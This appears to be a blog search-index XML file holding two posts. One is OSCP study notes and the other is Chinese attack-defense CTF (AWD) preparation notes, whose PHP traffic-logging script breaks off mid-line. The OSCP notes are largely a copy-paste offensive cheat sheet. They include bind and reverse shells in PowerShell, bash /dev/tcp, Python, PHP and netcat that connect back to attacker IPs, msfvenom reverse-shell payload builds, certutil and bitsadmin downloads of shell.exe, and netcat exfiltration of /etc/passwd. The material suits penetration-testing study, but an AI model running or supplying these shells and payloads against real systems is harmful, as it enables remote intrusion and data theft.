<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>OSCP学习笔记(部分)</title>
    <link href="/2022/03/03/OSCP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%83%A8%E5%88%86/"/>
    <url>/2022/03/03/OSCP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="OSCP"><a href="#OSCP" class="headerlink" title="OSCP"></a>OSCP</h1><p>author: Droaemoo</p><h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><h4 id="Windows-Login"><a href="#Windows-Login" class="headerlink" title="Windows Login"></a>Windows Login</h4><ol><li><p><strong>rdesktop -u administrator -p 123.com 192.168.62.128</strong></p></li><li><p><strong>python3 smbexec.py admin:<a href="mailto:&#x31;&#50;&#51;&#x31;&#x32;&#x33;&#x40;&#x31;&#48;&#46;&#x31;&#x30;&#x2e;&#49;&#48;&#46;&#x31;&#48;">&#x31;&#50;&#51;&#x31;&#x32;&#x33;&#x40;&#x31;&#48;&#46;&#x31;&#x30;&#x2e;&#49;&#48;&#46;&#x31;&#48;</a> cmd.exe</strong> </p></li><li><p><strong>python3 psexec.py administrator:<a href="mailto:&#49;&#x32;&#x33;&#46;&#x63;&#x6f;&#109;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#x36;&#x32;&#46;&#49;&#50;&#x38;">&#49;&#x32;&#x33;&#46;&#x63;&#x6f;&#109;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#x36;&#x32;&#46;&#49;&#50;&#x38;</a></strong></p></li><li><p><strong>evil-winrm -u administrator -p 123.com -i 192.168.62.128</strong></p></li></ol><p>​                open winrm : winrm quickconfig</p><p>​                winrm enumerate winrm&#x2F;config&#x2F;listener</p><p><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><h4 id="Linux-Login"><a href="#Linux-Login" class="headerlink" title="Linux Login"></a>Linux Login</h4><ol><li><p><strong>ssh <a href="mailto:&#106;&#111;&#x6e;&#97;&#x74;&#104;&#x61;&#x6e;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#54;&#x32;&#46;&#x31;&#51;&#48;">&#106;&#111;&#x6e;&#97;&#x74;&#104;&#x61;&#x6e;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#54;&#x32;&#46;&#x31;&#51;&#48;</a></strong></p></li><li><p>ssh -X <a href="mailto:&#106;&#111;&#110;&#97;&#116;&#104;&#97;&#x6e;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#54;&#x32;&#x2e;&#49;&#51;&#x30;">&#106;&#111;&#110;&#97;&#116;&#104;&#97;&#x6e;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#54;&#x32;&#x2e;&#49;&#51;&#x30;</a></p></li><li><p><strong>rdesktop 192.168.62.130</strong></p></li><li><p>vncviewer 192.168.62.130:5901</p></li></ol><h3 id="File-Download"><a href="#File-Download" class="headerlink" title="File Download"></a>File Download</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>1.wget <a href="https://bootstrap.pypa.io/get-pip.py">https://bootstrap.pypa.io/get-pip.py</a> -O pip.py</p><p>2.curl <a href="https://bootstrap.pypa.io/get-pip.py">https://bootstrap.pypa.io/get-pip.py</a> -o pip.py</p><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p><strong>certutil -urlcache -split -f <a href="http://192.168.62.130:8080/">http://192.168.62.130:8080</a> shell.exe</strong></p><p>powershell iwr <a href="http://www.baidu.com/">http://www.baidu.com</a> -o 123</p><p>powershell.exe invoke-webrequest -uri <a href="http://www.baidu.com/">http://www.baidu.com</a> -outfile 123</p><p>curl <a href="http://www.baidu.com/">http://www.baidu.com</a> -o 123</p><p><strong>bitsadmin &#x2F;transfer job &#x2F;download ‘<a href="http://192.168.62.130:8080/shell.exe&#39;">http://192.168.62.130:8080/shell.exe&#39;</a>  C:\Users\Jonathan\Desktop\shell.exe</strong></p><p>powershell wget <a href="http://www.baidu.com/">http://www.baidu.com</a> -o baidu.html</p><p><strong>powershell -c “(new-object system.net.webclient).downloadfile(‘<a href="http://www.baidu.com&/#39;,&#39;123.html&#39;">http://www.baidu.com&#39;,&#39;123.html&#39;</a>)</strong></p><h3 id="File-Transfer"><a href="#File-Transfer" class="headerlink" title="File Transfer"></a>File Transfer</h3><h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><p>Sender: nc -w 192.168.62.130 &lt; &#x2F;etc&#x2F;passwd</p><p>Receiver: nc -nlvp 4444 &gt; passwd</p><h4 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h4><p>powershell -c “(new-object system.net.webclient).downloadfile(‘<a href="http://www.baidu.com&/#39;,&#39;123.html&#39;">http://www.baidu.com&#39;,&#39;123.html&#39;</a>)</p><h3 id="File-Search"><a href="#File-Search" class="headerlink" title="File Search"></a>File Search</h3><h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><ol><li>sudo find &#x2F;etc -type f -writable 2&gt;&#x2F;dev&#x2F;null</li><li>sudo find &#x2F; -type f -perm 755 2&gt;&#x2F;dev&#x2F;null</li><li>sudo find &#x2F; -type f -name *pass* 2&gt;&#x2F;dev&#x2F;null </li><li>grep -R “passwd” &#x2F;etc 2&gt;&#x2F;dev&#x2F;null</li><li>which nmap </li><li>locate passwd</li></ol><p><strong>ps: &#x2F;dev&#x2F;null is bit bucket</strong></p><h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><ol><li>dir *.txt &#x2F;s &#x2F;p &#x2F;b</li></ol><h3 id="Web-Shell"><a href="#Web-Shell" class="headerlink" title="Web Shell"></a>Web Shell</h3><ol><li>kali &#x2F;usr&#x2F;share&#x2F;webshells</li></ol><h3 id="Bind-Shell"><a href="#Bind-Shell" class="headerlink" title="Bind Shell"></a>Bind Shell</h3><h4 id="NetCat-Bind-Shell"><a href="#NetCat-Bind-Shell" class="headerlink" title="NetCat Bind Shell"></a>NetCat Bind Shell</h4><p>​    Victim: nc -nlvp 4444 -e &#x2F;bin&#x2F;bash or nc -nlvp 4444 -e cmd.exe</p><p>​    kali: nc 192.168.62.137 4444</p><h4 id="SoCat"><a href="#SoCat" class="headerlink" title="SoCat"></a>SoCat</h4><p>​    Target (Linux): socat tcp-l:4444 exec:”bash -li’ </p><p>​    Target (Windows): socat tcp-l:4444 exec:powershell.exe,pipes </p><p>​    Attacker: socat tcp:10.10.10.10:4444 -</p><h4 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h4><p>​    Victim: powercat -l -p 4444 -e cmd.exe </p><p>​    Kali: nc 10.10.10.10 4444 </p><h4 id="PowerShell-1"><a href="#PowerShell-1" class="headerlink" title="PowerShell"></a>PowerShell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;<span class="hljs-variable">$listener</span> = New-Object System.Net.Sockets.TcpListener(&#x27;127.0.0.1&#x27;,4444);<span class="hljs-variable">$listener</span>.start();<span class="hljs-variable">$client</span> = <span class="hljs-variable">$listener</span>.AcceptTcpClient();<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()&quot;</span><br></code></pre></td></tr></table></figure><p>​     </p><h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><h4 id="PowerShell-2"><a href="#PowerShell-2" class="headerlink" title="PowerShell"></a>PowerShell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;<span class="hljs-variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;192.168.62.139&#x27;,8888);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="hljs-variable">$sendback2</span>  = <span class="hljs-variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()&quot;</span><br></code></pre></td></tr></table></figure><h4 id="tty-shell"><a href="#tty-shell" class="headerlink" title="tty shell"></a>tty shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;<br></code></pre></td></tr></table></figure><h4 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h4><p>​    Victim: nc 192.168.62.139 4444 -e cmd.exe or &#x2F;bin&#x2F;bash</p><p>​    Attacker: nv -lvp 4444</p><p>​    Upgrade to <strong>fully interactive shell</strong>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;<br></code></pre></td></tr></table></figure><h4 id="PowerCat-1"><a href="#PowerCat-1" class="headerlink" title="PowerCat"></a>PowerCat</h4><p>Victim: powercat -c 10.10.10.20 -p 4444 -e cmd.exe </p><h4 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h4><h5 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h5><p><strong>exe</strong>: msfvenom -p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.62.139 LPORT&#x3D;4444 -f exe &gt; shell.exe</p><p><strong>msi</strong>: msfvenom -p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.62.139 LPORT&#x3D;4444 -f exe &gt; shell.exe</p><p><strong>dll</strong>:msfvenom -p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.62.139 LPORT&#x3D;4444 -f dll &gt; shell.dll</p><h5 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h5><p><strong>so</strong>: msfvenom -p linux&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.6<br>2.139 LPORT&#x3D;4444 -f elf-so &gt; shell.so</p><p><strong>elf</strong>: msfvenom -p linux&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.62.139 LPORT&#x3D;4444 -f elf &gt; shell</p><h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.10.20&#x2F;4444 0&gt;&amp;1 </p><p>bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.10.20&#x2F;4444 0&gt;&amp;1’ </p><p>0&lt;&amp;196;exec196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.10.20&#x2F;4444;sh &lt;&amp;196 &gt;&amp;1962&gt;&amp;196 </p><p>&#x2F;bin&#x2F;bash -l &gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.10.20&#x2F;4444 0&lt;&amp;1 2&gt;&amp;1 </p><h4 id="NiShang"><a href="#NiShang" class="headerlink" title="NiShang"></a>NiShang</h4><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pty<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> os<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&quot;192.168.62.139&quot;</span>, <span class="hljs-number">4444</span>))<br>os.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><strong>PHP</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;10.10.10.20&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span> <br><br>php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;10.10.10.20&quot;,4444);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span> <br></code></pre></td></tr></table></figure><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Windows-3"><a href="#Windows-3" class="headerlink" title="Windows"></a>Windows</h3><ol><li><p><strong>whoami &#x2F;priv</strong>    Check available privilege</p></li><li><p><strong>net user</strong>     List users</p></li><li><p><strong>net user administrator</strong>     list more information for administrator</p></li><li><p><strong>hostname</strong>    enumeration the hostname</p></li><li><p><strong>systeminfo | findstr &#x2F;B &#x2F;C:”OS”</strong>    enumeration system information</p></li><li><p><strong>tasklist &#x2F;SVC</strong>    enumerration running processes and services</p></li><li><p>enumerating firewall status and rules </p><ol><li><strong>netsh advfirewall show currentprofile</strong></li><li><strong>netsh advfirewall firewall show rule name&#x3D;all</strong></li></ol></li><li><p><strong>schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</strong>    enumeration scheduled tasks</p></li><li><p><strong>wmic product get name, name, version, vendor</strong>   enumeration Applications and version</p></li><li><p><strong>wmic qfe get Caption, Description, HotFixID, InstalledOn</strong></p></li><li><p><strong>accesschk.exe -uws “Everyone” “C:\Program Files”</strong>   </p><p>search writeable&#x2F;readable files or directories</p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p></li><li><p><strong>Get-ChildItem “D:&quot; -Recurse | Get-ACL | ?{$_.AccessToString -match “Everyone\sAllow\s\sModify”}</strong></p></li><li><p><strong>mountvol</strong>    enumeration unmounted disks</p></li><li><p>driverquery.exe &#x2F;v &#x2F;fo csv</p></li><li><p><strong>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</strong></p></li><li><p><strong>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</strong></p></li></ol><h3 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h3><ol><li>id</li><li><strong>cat &#x2F;etc&#x2F;passwd</strong>     List users</li><li><strong>hostname</strong>    enumeration the hostname</li><li>list system information<ol><li><strong>cat &#x2F;etc&#x2F;issue</strong></li><li><strong>cat &#x2F;etc&#x2F;*-release</strong></li><li><strong>uname -a</strong></li></ol></li><li><strong>ps aux</strong>    enumerration running processes and services</li><li>route print</li><li>&#x2F;sbin&#x2F;route</li><li><strong>ls -lah &#x2F;etc&#x2F;crom</strong>*    enumeration scheduled tasks</li><li>cat &#x2F;etc&#x2F;crontab</li><li><strong>dpkg -l</strong>    list applications</li><li>find &#x2F; -writable -type d 2&gt;&#x2F;dev&#x2F;null</li><li><strong>&#x2F;bin&#x2F;lsblk</strong>     enumeration unmounted disks</li><li>cat &#x2F;etc&#x2F;fstab or mount</li><li>lsmod</li><li>&#x2F;sbin&#x2F;modinfo libata</li><li>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</li></ol><h2 id="Port-Forward"><a href="#Port-Forward" class="headerlink" title="Port Forward"></a>Port Forward</h2><p>ssh -N -f -L 3389:192.168.100.10:3389 <a href="mailto:&#106;&#111;&#x6a;&#x6f;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#54;&#50;&#46;&#49;&#x34;&#x30;">&#106;&#111;&#x6a;&#x6f;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#54;&#50;&#46;&#49;&#x34;&#x30;</a></p><p>ssh -N -f -R 4444:192.168.100.10:3389 <a href="mailto:&#106;&#111;&#x6e;&#97;&#x74;&#104;&#x61;&#110;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#54;&#x32;&#46;&#x31;&#51;&#57;">&#106;&#111;&#x6e;&#97;&#x74;&#104;&#x61;&#110;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#54;&#x32;&#46;&#x31;&#51;&#57;</a></p><p>ssh -N -f -D 127.0.0.1:8080 <a href="mailto:&#106;&#x6f;&#x6e;&#97;&#116;&#x68;&#97;&#110;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x31;&#x30;&#48;&#46;&#49;&#48;">&#106;&#x6f;&#x6e;&#97;&#116;&#x68;&#97;&#110;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x31;&#x30;&#48;&#46;&#49;&#48;</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>OSCP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWD</title>
    <link href="/2022/03/03/AWD/"/>
    <url>/2022/03/03/AWD/</url>
    
    <content type="html"><![CDATA[<h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><blockquote><p>经过整理，需要的一些工具和脚本和自己的字典（方便到时候直接复制粘贴，提高效率）</p></blockquote><h3 id="1-工具"><a href="#1-工具" class="headerlink" title="1. 工具"></a>1. 工具</h3><blockquote><ul><li>D盾</li><li>WireShark</li><li>burpsuite（搭配其中的工具Reissue Request Scripter，可以根据你抓到的请求包直接生成请求脚本）</li><li>nmap或者<a href="https://github.com/zer0h/httpscan">httpscan</a></li><li>服务器管理软件，比如XFTP</li></ul></blockquote><h3 id="2-脚本"><a href="#2-脚本" class="headerlink" title="2. 脚本"></a>2. 脚本</h3><blockquote><ul><li>流量监控waf</li><li>加密shell（MD5，RSA等等，都可）</li></ul></blockquote><h3 id="3-备份"><a href="#3-备份" class="headerlink" title="3.备份"></a>3.备份</h3><h4 id="站点源码备份"><a href="#站点源码备份" class="headerlink" title="站点源码备份"></a>站点源码备份</h4><blockquote><p>源码备份可以用前面所说的工具<code>Winscp</code>或者<code>FileZilla</code>，但是每个主办方服务器不同，你要把他拉到本机可能会速度比较慢。</p><p>速度快的方法就是直接用<code>tar</code>打包，放在自己的<code>home</code>目录下（这里队友@CjM00n提到一点，最好不要放在<code>tmp</code>目录下，因为这个目录没有权限配置，同理我们要是拿到了shell，可以到别人<code>tmp</code>目录下康康，说不定能找到一些好康的），然后再把他传到本机来</p></blockquote><p><code>tar</code>备份方法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">cd /var/www/html<br>tar -zcvf ~/html.tar.gz *<br></code></pre></td></tr></table></figure><p>还原的话方法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm -rf /var/www/html<br>tar -zxvf ~/html.tar.gz -C /var/www/html<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /var/www/html<br>rm -rf *<br>tar -zxvf ~/html.tar.gz<br></code></pre></td></tr></table></figure><h4 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h4><blockquote><p>有时候数据库里也有flag，所以要将数据库也备份一下，避免删库跑路</p><p>首先是找配置文件，翻一翻账号密码</p></blockquote><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cd <span class="hljs-regexp">/var/</span>www/html<br><span class="hljs-keyword">find</span> .|xargs <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;password&quot;</span><br></code></pre></td></tr></table></figure><p>备份：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /var/lib/mysql <span class="hljs-comment">#(进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)</span></span><br><span class="hljs-meta">$ </span><span class="language-bash">mysqldump -u root -p Test &gt; Test.sql <span class="hljs-comment"># 输入密码即可。</span></span><br><span class="hljs-meta">$ </span><span class="language-bash">mysqldump -u root -p --all-databases &gt; ~/backup.sql  <span class="hljs-comment"># 备份所有数据库</span></span><br><span class="hljs-meta">$ </span><span class="language-bash">mysqldump -u root -p --all-databases -skip-lock-tables &gt; ~/backup.sql  <span class="hljs-comment"># 跳过锁定的数据库表</span></span><br></code></pre></td></tr></table></figure><p>还原：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$ </span><span class="language-bash">mysql -u root -p</span><br><span class="hljs-meta">mysql&gt; </span><span class="language-bash">create database [database_name];  <span class="hljs-comment"># 输入要还原的数据库名</span></span><br><span class="hljs-meta">mysql&gt; </span><span class="language-bash">use [database_name]</span><br><span class="hljs-meta">mysql&gt; </span><span class="language-bash"><span class="hljs-built_in">source</span> backup.sql;    <span class="hljs-comment"># source后跟备份的文件名Copy</span></span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /var/lib/mysql <span class="hljs-comment"># (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)</span></span><br><span class="hljs-meta">$ </span><span class="language-bash">mysql -u root -p Test &lt; Test.sql  <span class="hljs-comment"># 输入密码即可（将要恢复的数据库文件放到服务器的某个目</span></span><br></code></pre></td></tr></table></figure><h3 id="4-口令修改"><a href="#4-口令修改" class="headerlink" title="4. 口令修改"></a>4. 口令修改</h3><blockquote><p>需要修改的口令包括：ssh弱口令、CMS后台弱口令、数据库root口令</p></blockquote><h4 id="数据库口令修改"><a href="#数据库口令修改" class="headerlink" title="数据库口令修改"></a>数据库口令修改</h4><blockquote><p>一般来说，数据库的密码是一定要修改的</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">$ mysql -u root -p<br>show databases;<br>use mysql<br>set password for root@localhost = password(&#x27;123&#x27;);<br>或者<br>update user set password = PASSWORD(&#x27;需要更换的密码&#x27;) where user=&#x27;root&#x27;;<br>update user set password = PASSWORD(&#x27;1&#x27;) where user=&#x27;root&#x27;;<br>flush privileges;<br>show tables;   # 看看有没有flag<br></code></pre></td></tr></table></figure><h4 id="修改SSH口令"><a href="#修改SSH口令" class="headerlink" title="修改SSH口令"></a>修改SSH口令</h4><p>首先登陆SSH，然后：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">passwd [user]<br></code></pre></td></tr></table></figure><blockquote><p>限制ssh登陆，进行访问控制<br>禁止从xx.xx.xx.xx远程登陆到本机iptables -t filter -A INPUT -s xx.xx.xx.xx -p tcp –dport 22 -j DROP#允许xx.xx.xx.xx网段远程登陆访问sshiptables -A INPUT -s xx.xx.xx.1&#x2F;24 -p tcp –dport 22 -j ACCEPT</p></blockquote><h4 id="关闭指定端口"><a href="#关闭指定端口" class="headerlink" title="关闭指定端口"></a>关闭指定端口</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kill -9 $(netstat -nlp | grep :8080 | awk &#x27;&#123;print $7&#125;&#x27; | awk -F&quot;/&quot; &#x27;&#123; print $1 &#125;&#x27;)<br></code></pre></td></tr></table></figure><h4 id="关闭除指定端口以外的所有端口"><a href="#关闭除指定端口以外的所有端口" class="headerlink" title="关闭除指定端口以外的所有端口"></a>关闭除指定端口以外的所有端口</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kill -9 $(netstat -anopt | grep -v &quot;sshd\|httpd\|mysqld&quot; | awk &#x27;&#123;print $7&#125;&#x27; | awk -F&quot;/&quot; &#x27;&#123; print $1 &#125;&#x27;)<br></code></pre></td></tr></table></figure><h3 id="5-上WAF"><a href="#5-上WAF" class="headerlink" title="5.上WAF"></a>5.上WAF</h3><h4 id="流量监控"><a href="#流量监控" class="headerlink" title="流量监控"></a>流量监控</h4><blockquote><p>改完密码之后第一件事，就是上流量监控的脚本。</p><p>这个真的很重要很重要！因为当你自己找不到漏洞的时候，一个好的流量监控脚本可以帮助你找到漏洞（抄作业</p><p>然后你可以通过这些流量把洞补了，再拿它来打别人，如果遇到垃圾流量又是另一回事了。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];      <span class="hljs-comment">//记录访问者的ip</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>];       <span class="hljs-comment">//访问者要访问的文件名</span><br><span class="hljs-variable">$parameter</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;QUERY_STRING&quot;</span>];      <span class="hljs-comment">//访问者要请求的参数</span><br><span class="hljs-variable">$method</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>];       <span class="hljs-comment">//请求方法</span><br><span class="hljs-variable">$uri</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>];             <span class="hljs-comment">//请求URI</span><br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ 